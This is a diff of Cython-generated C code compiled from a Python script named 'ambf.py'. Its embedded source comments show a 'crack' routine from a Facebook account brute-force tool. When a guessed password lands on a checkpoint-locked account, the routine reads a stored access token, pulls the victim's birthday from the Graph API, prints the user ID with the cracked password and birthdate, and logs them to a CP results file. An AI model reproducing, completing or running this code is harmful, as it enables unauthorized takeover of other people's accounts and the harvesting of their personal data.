-                        __pyx_t_8 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 508, __pyx_L49_error)
-                        __Pyx_GOTREF(__pyx_t_8);
-                        __pyx_t_11 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 508, __pyx_L49_error)
-                        __Pyx_GOTREF(__pyx_t_11);
-                        __pyx_t_12 = PySequence_ITEM(sequence, 2); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 508, __pyx_L49_error)
-                        __Pyx_GOTREF(__pyx_t_12);
-                        #endif
-                        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-                      } else {
-                        Py_ssize_t index = -1;
-                        __pyx_t_6 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 508, __pyx_L49_error)
-                        __Pyx_GOTREF(__pyx_t_6);
-                        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-                        __pyx_t_22 = Py_TYPE(__pyx_t_6)->tp_iternext;
-                        index = 0; __pyx_t_8 = __pyx_t_22(__pyx_t_6); if (unlikely(!__pyx_t_8)) goto __pyx_L57_unpacking_failed;
-                        __Pyx_GOTREF(__pyx_t_8);
-                        index = 1; __pyx_t_11 = __pyx_t_22(__pyx_t_6); if (unlikely(!__pyx_t_11)) goto __pyx_L57_unpacking_failed;
-                        __Pyx_GOTREF(__pyx_t_11);
-                        index = 2; __pyx_t_12 = __pyx_t_22(__pyx_t_6); if (unlikely(!__pyx_t_12)) goto __pyx_L57_unpacking_failed;
-                        __Pyx_GOTREF(__pyx_t_12);
-                        if (__Pyx_IternextUnpackEndCheck(__pyx_t_22(__pyx_t_6), 3) < 0) __PYX_ERR(0, 508, __pyx_L49_error)
-                        __pyx_t_22 = NULL;
-                        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
-                        goto __pyx_L58_unpacking_done;
-                        __pyx_L57_unpacking_failed:;
-                        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
-                        __pyx_t_22 = NULL;
-                        if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
-                        __PYX_ERR(0, 508, __pyx_L49_error)
-                        __pyx_L58_unpacking_done:;
-                      }
-                      __pyx_v_month = __pyx_t_8;
-                      __pyx_t_8 = 0;
-                      __pyx_v_day = __pyx_t_11;
-                      __pyx_t_11 = 0;
-                      __pyx_v_year = __pyx_t_12;
-                      __pyx_t_12 = 0;
-
-                      /* "ambf.py":509
- * 						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
- * 						month, day, year = ttl.split("/")
- * 						month = bulan_ttl[month]             # <<<<<<<<<<<<<<
- * 						print("\r  \033[0;93m* --> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
- * 						cp.append("%s|%s"%(uid, pw))
- */
-                      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_bulan_ttl); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 509, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_10);
-                      __pyx_t_12 = __Pyx_PyObject_GetItem(__pyx_t_10, __pyx_v_month); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 509, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_12);
-                      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-                      __Pyx_DECREF_SET(__pyx_v_month, __pyx_t_12);
-                      __pyx_t_12 = 0;
-
-                      /* "ambf.py":510
- * 						month, day, year = ttl.split("/")
- * 						month = bulan_ttl[month]
- * 						print("\r  \033[0;93m* --> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))             # <<<<<<<<<<<<<<
- * 						cp.append("%s|%s"%(uid, pw))
- * 						open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
- */
-                      __pyx_t_12 = PyTuple_New(5); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 510, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_12);
-                      __Pyx_INCREF(__pyx_v_uid);
-                      __Pyx_GIVEREF(__pyx_v_uid);
-                      PyTuple_SET_ITEM(__pyx_t_12, 0, __pyx_v_uid);
-                      __Pyx_INCREF(__pyx_v_pw);
-                      __Pyx_GIVEREF(__pyx_v_pw);
-                      PyTuple_SET_ITEM(__pyx_t_12, 1, __pyx_v_pw);
-                      __Pyx_INCREF(__pyx_v_day);
-                      __Pyx_GIVEREF(__pyx_v_day);
-                      PyTuple_SET_ITEM(__pyx_t_12, 2, __pyx_v_day);
-                      __Pyx_INCREF(__pyx_v_month);
-                      __Pyx_GIVEREF(__pyx_v_month);
-                      PyTuple_SET_ITEM(__pyx_t_12, 3, __pyx_v_month);
-                      __Pyx_INCREF(__pyx_v_year);
-                      __Pyx_GIVEREF(__pyx_v_year);
-                      PyTuple_SET_ITEM(__pyx_t_12, 4, __pyx_v_year);
-                      __pyx_t_10 = __Pyx_PyString_Format(__pyx_kp_s_0_93m_s_s_s_s_s_0_97m, __pyx_t_12); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 510, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_10);
-                      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-                      if (__Pyx_PrintOne(0, __pyx_t_10) < 0) __PYX_ERR(0, 510, __pyx_L49_error)
-                      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-
-                      /* "ambf.py":511
- * 						month = bulan_ttl[month]
- * 						print("\r  \033[0;93m* --> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
- * 						cp.append("%s|%s"%(uid, pw))             # <<<<<<<<<<<<<<
- * 						open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
- * 						break
- */
-                      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_cp); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 511, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_10);
-                      __pyx_t_12 = PyTuple_New(2); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 511, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_12);
-                      __Pyx_INCREF(__pyx_v_uid);
-                      __Pyx_GIVEREF(__pyx_v_uid);
-                      PyTuple_SET_ITEM(__pyx_t_12, 0, __pyx_v_uid);
-                      __Pyx_INCREF(__pyx_v_pw);
-                      __Pyx_GIVEREF(__pyx_v_pw);
-                      PyTuple_SET_ITEM(__pyx_t_12, 1, __pyx_v_pw);
-                      __pyx_t_11 = __Pyx_PyString_Format(__pyx_kp_s_s_s, __pyx_t_12); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 511, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_11);
-                      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-                      __pyx_t_23 = __Pyx_PyObject_Append(__pyx_t_10, __pyx_t_11); if (unlikely(__pyx_t_23 == ((int)-1))) __PYX_ERR(0, 511, __pyx_L49_error)
-                      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-                      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-
-                      /* "ambf.py":512
- * 						print("\r  \033[0;93m* --> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
- * 						cp.append("%s|%s"%(uid, pw))
- * 						open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))             # <<<<<<<<<<<<<<
- * 						break
- * 				except (KeyError, IOError):
- */
-                      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_tanggal); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 512, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_10);
-                      __pyx_t_12 = __Pyx_PyString_FormatSafe(__pyx_kp_s_CP_s_txt, __pyx_t_10); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 512, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_12);
-                      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-                      __pyx_t_10 = PyTuple_New(2); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 512, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_10);
-                      __Pyx_GIVEREF(__pyx_t_12);
-                      PyTuple_SET_ITEM(__pyx_t_10, 0, __pyx_t_12);
-                      __Pyx_INCREF(__pyx_n_s_a);
-                      __Pyx_GIVEREF(__pyx_n_s_a);
-                      PyTuple_SET_ITEM(__pyx_t_10, 1, __pyx_n_s_a);
-                      __pyx_t_12 = 0;
-                      __pyx_t_12 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_10, NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 512, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_12);
-                      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-                      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_write); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 512, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_10);
-                      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-                      __pyx_t_12 = PyTuple_New(5); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 512, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_12);
-                      __Pyx_INCREF(__pyx_v_uid);
-                      __Pyx_GIVEREF(__pyx_v_uid);
-                      PyTuple_SET_ITEM(__pyx_t_12, 0, __pyx_v_uid);
-                      __Pyx_INCREF(__pyx_v_pw);
-                      __Pyx_GIVEREF(__pyx_v_pw);
-                      PyTuple_SET_ITEM(__pyx_t_12, 1, __pyx_v_pw);
-                      __Pyx_INCREF(__pyx_v_day);
-                      __Pyx_GIVEREF(__pyx_v_day);
-                      PyTuple_SET_ITEM(__pyx_t_12, 2, __pyx_v_day);
-                      __Pyx_INCREF(__pyx_v_month);
-                      __Pyx_GIVEREF(__pyx_v_month);
-                      PyTuple_SET_ITEM(__pyx_t_12, 3, __pyx_v_month);
-                      __Pyx_INCREF(__pyx_v_year);
-                      __Pyx_GIVEREF(__pyx_v_year);
-                      PyTuple_SET_ITEM(__pyx_t_12, 4, __pyx_v_year);
-                      __pyx_t_8 = __Pyx_PyString_Format(__pyx_kp_s_s_s_s_s_s, __pyx_t_12); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 512, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_8);
-                      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-                      __pyx_t_12 = NULL;
-                      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
-                        __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_10);
-                        if (likely(__pyx_t_12)) {
-                          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
-                          __Pyx_INCREF(__pyx_t_12);
-                          __Pyx_INCREF(function);
-                          __Pyx_DECREF_SET(__pyx_t_10, function);
-                        }
-                      }
-                      __pyx_t_11 = (__pyx_t_12) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_12, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_8);
-                      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
-                      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-                      if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 512, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_11);
-                      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-                      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-
-                      /* "ambf.py":513
- * 						cp.append("%s|%s"%(uid, pw))
- * 						open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
- * 						break             # <<<<<<<<<<<<<<
- * 				except (KeyError, IOError):
- * 					day = (" ")
- */
-                      goto __pyx_L54_try_break;
-
-                      /* "ambf.py":506
- * 				try:
- * 					token = open("login.txt", "r").read()
- * 					with requests.Session() as ses:             # <<<<<<<<<<<<<<
- * 						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
- * 						month, day, year = ttl.split("/")
- */
-                    }
-                    __pyx_L49_error:;
-                    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
-                    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
-                    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
-                    __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
-                    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-                    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
-                    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
-                    /*except:*/ {
-                      __Pyx_AddTraceback("ambf.crack", __pyx_clineno, __pyx_lineno, __pyx_filename);
-                      if (__Pyx_GetException(&__pyx_t_11, &__pyx_t_10, &__pyx_t_8) < 0) __PYX_ERR(0, 506, __pyx_L51_except_error)
-                      __Pyx_GOTREF(__pyx_t_11);
-                      __Pyx_GOTREF(__pyx_t_10);
-                      __Pyx_GOTREF(__pyx_t_8);
-                      __pyx_t_12 = PyTuple_Pack(3, __pyx_t_11, __pyx_t_10, __pyx_t_8); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 506, __pyx_L51_except_error)
-                      __Pyx_GOTREF(__pyx_t_12);
-                      __pyx_t_28 = __Pyx_PyObject_Call(__pyx_t_24, __pyx_t_12, NULL);
-                      __Pyx_DECREF(__pyx_t_24); __pyx_t_24 = 0;
-                      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-                      if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 506, __pyx_L51_except_error)
-                      __Pyx_GOTREF(__pyx_t_28);
-                      __pyx_t_21 = __Pyx_PyObject_IsTrue(__pyx_t_28);
-                      __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
-                      if (__pyx_t_21 < 0) __PYX_ERR(0, 506, __pyx_L51_except_error)
-                      __pyx_t_20 = ((!(__pyx_t_21 != 0)) != 0);
-                      if (__pyx_t_20) {
-                        __Pyx_GIVEREF(__pyx_t_11);
-                        __Pyx_GIVEREF(__pyx_t_10);
-                        __Pyx_XGIVEREF(__pyx_t_8);
-                        __Pyx_ErrRestoreWithState(__pyx_t_11, __pyx_t_10, __pyx_t_8);
-                        __pyx_t_11 = 0; __pyx_t_10 = 0; __pyx_t_8 = 0; 
-                        __PYX_ERR(0, 506, __pyx_L51_except_error)
-                      }
-                      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
-                      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
-                      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
-                      goto __pyx_L50_exception_handled;
-                    }
-                    __pyx_L51_except_error:;
-                    __Pyx_XGIVEREF(__pyx_t_25);
-                    __Pyx_XGIVEREF(__pyx_t_26);
-                    __Pyx_XGIVEREF(__pyx_t_27);
-                    __Pyx_ExceptionReset(__pyx_t_25, __pyx_t_26, __pyx_t_27);
-                    goto __pyx_L35_error;
-                    __pyx_L54_try_break:;
-                    __Pyx_XGIVEREF(__pyx_t_25);
-                    __Pyx_XGIVEREF(__pyx_t_26);
-                    __Pyx_XGIVEREF(__pyx_t_27);
-                    __Pyx_ExceptionReset(__pyx_t_25, __pyx_t_26, __pyx_t_27);
-                    goto __pyx_L45_break;
-                    __pyx_L50_exception_handled:;
-                    __Pyx_XGIVEREF(__pyx_t_25);
-                    __Pyx_XGIVEREF(__pyx_t_26);
-                    __Pyx_XGIVEREF(__pyx_t_27);
-                    __Pyx_ExceptionReset(__pyx_t_25, __pyx_t_26, __pyx_t_27);
-                  }
-                }
-                /*finally:*/ {
-                  /*normal exit:*/{
-                    if (__pyx_t_24) {
-                      __pyx_t_27 = __Pyx_PyObject_Call(__pyx_t_24, __pyx_tuple__40, NULL);
-                      __Pyx_DECREF(__pyx_t_24); __pyx_t_24 = 0;
-                      if (unlikely(!__pyx_t_27)) __PYX_ERR(0, 506, __pyx_L35_error)
-                      __Pyx_GOTREF(__pyx_t_27);
-                      __Pyx_DECREF(__pyx_t_27); __pyx_t_27 = 0;
-                    }
-                    goto __pyx_L48;
-                  }
-                  __pyx_L45_break: {
-                    if (__pyx_t_24) {
-                      __pyx_t_27 = __Pyx_PyObject_Call(__pyx_t_24, __pyx_tuple__40, NULL);
-                      __Pyx_DECREF(__pyx_t_24); __pyx_t_24 = 0;
-                      if (unlikely(!__pyx_t_27)) __PYX_ERR(0, 506, __pyx_L35_error)
-                      __Pyx_GOTREF(__pyx_t_27);
-                      __Pyx_DECREF(__pyx_t_27); __pyx_t_27 = 0;
-                    }
-                    goto __pyx_L40_try_break;
-                  }
-                  __pyx_L48:;
-                }
-                goto __pyx_L62;
-                __pyx_L43_error:;
-                __Pyx_DECREF(__pyx_t_24); __pyx_t_24 = 0;
-                goto __pyx_L35_error;
-                __pyx_L62:;
-              }
-
-              /* "ambf.py":504
- * 				break
- * 			elif "checkpoint" in ses.cookies.get_dict().keys():
- * 				try:             # <<<<<<<<<<<<<<
- * 					token = open("login.txt", "r").read()
- * 					with requests.Session() as ses:
- */
             }
-            __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
-            __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
-            __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
-            goto __pyx_L42_try_end;
-            __pyx_L35_error:;
-            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
-            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
-            __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
-            __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
-            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
+            __pyx_t_11 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
             __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
-
-            /* "ambf.py":514
- * 						open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
- * 						break
- * 				except (KeyError, IOError):             # <<<<<<<<<<<<<<
- * 					day = (" ")
- * 					month = (" ")
- */
-            __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
-            if (__pyx_t_7) {
-              __Pyx_AddTraceback("ambf.crack", __pyx_clineno, __pyx_lineno, __pyx_filename);
-              if (__Pyx_GetException(&__pyx_t_8, &__pyx_t_10, &__pyx_t_11) < 0) __PYX_ERR(0, 514, __pyx_L37_except_error)
-              __Pyx_GOTREF(__pyx_t_8);
-              __Pyx_GOTREF(__pyx_t_10);
-              __Pyx_GOTREF(__pyx_t_11);
-
-              /* "ambf.py":515
- * 						break
- * 				except (KeyError, IOError):
- * 					day = (" ")             # <<<<<<<<<<<<<<
- * 					month = (" ")
- * 					year = (" ")
- */
-              __Pyx_INCREF(__pyx_kp_s__8);
-              __Pyx_XDECREF_SET(__pyx_v_day, __pyx_kp_s__8);
-
-              /* "ambf.py":516
- * 				except (KeyError, IOError):
- * 					day = (" ")
- * 					month = (" ")             # <<<<<<<<<<<<<<
- * 					year = (" ")
- * 				except:pass
- */
-              __Pyx_INCREF(__pyx_kp_s__8);
-              __Pyx_XDECREF_SET(__pyx_v_month, __pyx_kp_s__8);
-
-              /* "ambf.py":517
- * 					day = (" ")
- * 					month = (" ")
- * 					year = (" ")             # <<<<<<<<<<<<<<
- * 				except:pass
- * 				print("\r  \033[0;93m* --> %s|%s\033[0;97m        "%(uid, pw))
- */
-              __Pyx_INCREF(__pyx_kp_s__8);
-              __Pyx_XDECREF_SET(__pyx_v_year, __pyx_kp_s__8);
-              __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
-              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
-              __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
-              goto __pyx_L36_exception_handled;
+            if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 505, __pyx_L29_error)
+            __Pyx_GOTREF(__pyx_t_11);
+            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+            __pyx_t_21 = __Pyx_PyObject_LookupSpecial(__pyx_t_11, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 505, __pyx_L29_error)
+            __Pyx_GOTREF(__pyx_t_21);
+            __pyx_t_8 = __Pyx_PyObject_LookupSpecial(__pyx_t_11, __pyx_n_s_enter); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 505, __pyx_L37_error)
+            __Pyx_GOTREF(__pyx_t_8);
+            __pyx_t_12 = NULL;
+            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
+              __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_8);
+              if (likely(__pyx_t_12)) {
+                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
+                __Pyx_INCREF(__pyx_t_12);
+                __Pyx_INCREF(function);
+                __Pyx_DECREF_SET(__pyx_t_8, function);
+              }
             }
+            __pyx_t_10 = (__pyx_t_12) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_12) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
+            __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
+            if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 505, __pyx_L37_error)
+            __Pyx_GOTREF(__pyx_t_10);
+            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+            __pyx_t_8 = __pyx_t_10;
+            __pyx_t_10 = 0;
+            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+            /*try:*/ {
+              {
+                __Pyx_PyThreadState_declare
+                __Pyx_PyThreadState_assign
+                __Pyx_ExceptionSave(&__pyx_t_22, &__pyx_t_23, &__pyx_t_24);
+                __Pyx_XGOTREF(__pyx_t_22);
+                __Pyx_XGOTREF(__pyx_t_23);
+                __Pyx_XGOTREF(__pyx_t_24);
+                /*try:*/ {
+                  __Pyx_DECREF_SET(__pyx_v_ses, __pyx_t_8);
+                  __pyx_t_8 = 0;
 
-            /* "ambf.py":518
- * 					month = (" ")
- * 					year = (" ")
- * 				except:pass             # <<<<<<<<<<<<<<
- * 				print("\r  \033[0;93m* --> %s|%s\033[0;97m        "%(uid, pw))
- * 				cp.append("%s|%s"%(uid, pw))
+                  /* "ambf.py":506
+ * 				token = open("login.txt", "r").read()
+ * 				with requests.Session() as ses:
+ * 					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]             # <<<<<<<<<<<<<<
+ * 					month, day, year = ttl.split("/")
+ * 					month = bulan_ttl[month]
  */
-            /*except:*/ {
-              __Pyx_ErrRestore(0,0,0);
-              goto __pyx_L36_exception_handled;
+                  __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_get); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 506, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_10);
+                  __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_token); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 506, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_12);
+                  __pyx_t_6 = PyTuple_New(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 506, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_6);
+                  __Pyx_INCREF(__pyx_v_uid);
+                  __Pyx_GIVEREF(__pyx_v_uid);
+                  PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_v_uid);
+                  __Pyx_GIVEREF(__pyx_t_12);
+                  PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_t_12);
+                  __pyx_t_12 = 0;
+                  __pyx_t_12 = __Pyx_PyString_Format(__pyx_kp_s_https_graph_facebook_com_s_acces, __pyx_t_6); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 506, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_12);
+                  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
+                  __pyx_t_6 = NULL;
+                  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
+                    __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_10);
+                    if (likely(__pyx_t_6)) {
+                      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
+                      __Pyx_INCREF(__pyx_t_6);
+                      __Pyx_INCREF(function);
+                      __Pyx_DECREF_SET(__pyx_t_10, function);
+                    }
+                  }
+                  __pyx_t_11 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_6, __pyx_t_12) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_12);
+                  __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
+                  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+                  if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 506, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_11);
+                  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+                  __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_json); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 506, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_10);
+                  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+                  __pyx_t_11 = NULL;
+                  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
+                    __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_10);
+                    if (likely(__pyx_t_11)) {
+                      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
+                      __Pyx_INCREF(__pyx_t_11);
+                      __Pyx_INCREF(function);
+                      __Pyx_DECREF_SET(__pyx_t_10, function);
+                    }
+                  }
+                  __pyx_t_8 = (__pyx_t_11) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_11) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
+                  __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
+                  if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 506, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_8);
+                  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+                  __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_t_8, __pyx_n_s_birthday); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 506, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_10);
+                  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+                  __pyx_v_ttl = __pyx_t_10;
+                  __pyx_t_10 = 0;
+
+                  /* "ambf.py":507
+ * 				with requests.Session() as ses:
+ * 					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
+ * 					month, day, year = ttl.split("/")             # <<<<<<<<<<<<<<
+ * 					month = bulan_ttl[month]
+ * 					print("\r  \033[0;93m* --> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
+ */
+                  __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_ttl, __pyx_n_s_split); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 507, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_8);
+                  __pyx_t_11 = NULL;
+                  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
+                    __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_8);
+                    if (likely(__pyx_t_11)) {
+                      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
+                      __Pyx_INCREF(__pyx_t_11);
+                      __Pyx_INCREF(function);
+                      __Pyx_DECREF_SET(__pyx_t_8, function);
+                    }
+                  }
+                  __pyx_t_10 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_11, __pyx_kp_s__45) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_kp_s__45);
+                  __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
+                  if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 507, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_10);
+                  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+                  if ((likely(PyTuple_CheckExact(__pyx_t_10))) || (PyList_CheckExact(__pyx_t_10))) {
+                    PyObject* sequence = __pyx_t_10;
+                    Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
+                    if (unlikely(size != 3)) {
+                      if (size > 3) __Pyx_RaiseTooManyValuesError(3);
+                      else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
+                      __PYX_ERR(0, 507, __pyx_L43_error)
+                    }
